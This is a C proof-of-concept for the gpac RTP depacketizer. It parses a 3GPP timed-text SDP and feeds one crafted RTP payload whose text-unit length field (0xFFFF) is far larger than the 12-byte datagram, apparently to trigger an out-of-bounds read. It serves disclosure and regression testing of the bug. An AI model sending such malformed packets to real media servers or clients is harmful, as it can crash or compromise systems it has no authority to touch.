/*
 * PoC for gpac RTP depacketizer (3GPP timed text).
 *
 * Drives an ordinary SDP-described 3gpp-tt stream through the public API
 * (gf_sdp_info_parse -> gf_rtp_depacketizer_new -> gf_rtp_depacketizer_process)
 * and feeds one RTP payload carrying a single timed text unit of type 4
 * (text modifier) whose advertised TTU length field (0xFFFF) is far larger
 * than the actual payload datagram.
 */
#include <stdio.h>
#include <string.h>

#include <gpac/tools.h>
#include <gpac/list.h>
#include <gpac/sync_layer.h>
#include <gpac/ietf.h>

static const char *sdp_desc =
	"v=0\n"
	"o=- 0 0 IN IP4 127.0.0.1\n"
	"s=3gpp timed text\n"
	"c=IN IP4 127.0.0.1\n"
	"t=0 0\n"
	"m=text 49170 RTP/AVP 96\n"
	"a=rtpmap:96 3gpp-tt/1000\n"
	"a=fmtp:96 tx3g=AAAALnR4M2cAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAABYAAAH/AAAAAQABAA==\n"
	"a=control:trackID=1\n";

static void on_sl_packet(void *udta, u8 *payload, u32 size, GF_SLHeader *hdr, GF_Err e)
{
	fprintf(stderr, "[cbk] SL packet: %u byte(s), ts=%u\n", size, hdr->compositionTimeStamp);
}

int main(void)
{
	GF_SDPInfo *sdp;
	GF_SDPMedia *media;
	GF_RTPDepacketizer *rtpd;
	GF_RTPHeader hdr;
	u8 *payload;
	u32 size = 12;

	gf_sys_init(GF_MemTrackerNone, NULL);

	sdp = gf_sdp_info_new();
	if (gf_sdp_info_parse(sdp, (char *) sdp_desc, (u32) strlen(sdp_desc)) != GF_OK) {
		fprintf(stderr, "SDP parse failed\n");
		return 1;
	}
	media = (GF_SDPMedia *) gf_list_get(sdp->media_desc, 0);
	if (!media) {
		fprintf(stderr, "no media in SDP\n");
		return 1;
	}

	rtpd = gf_rtp_depacketizer_new(media, 0, on_sl_packet, NULL);
	if (!rtpd) {
		fprintf(stderr, "depacketizer creation failed\n");
		return 1;
	}

	memset(&hdr, 0, sizeof(hdr));
	hdr.Version = 2;
	hdr.Marker = 0;
	hdr.PayloadType = 96;
	hdr.SequenceNumber = 1;
	hdr.TimeStamp = 1000;

	/* single TTU, type 4 (text modifier): all fields ordinary except the
	   advertised length, which exceeds the datagram */
	payload = (u8 *) gf_malloc(size);
	payload[0] = 0x04;             /* UTF-8, P=0, type=4 */
	payload[1] = 0xFF;             /* ttu_len MSB */
	payload[2] = 0xFF;             /* ttu_len LSB: 65535 */
	payload[3] = 0x10;             /* modifier: 1 fragment, fragment #0 */
	payload[4] = 0x00;             /* duration MSB */
	payload[5] = 0x0B;             /* duration */
	payload[6] = 0xB8;             /* duration LSB: 3000 */
	payload[7] = 0x00;             /* modifier payload */
	payload[8] = 0x00;
	payload[9] = 0x00;
	payload[10] = 0x08;
	payload[11] = 0x00;

	gf_rtp_depacketizer_process(rtpd, &hdr, payload, size);
	fprintf(stderr, "processed payload without crash\n");

	gf_free(payload);
	gf_rtp_depacketizer_del(rtpd);
	gf_sdp_info_del(sdp);
	gf_sys_close();
	return 0;
}
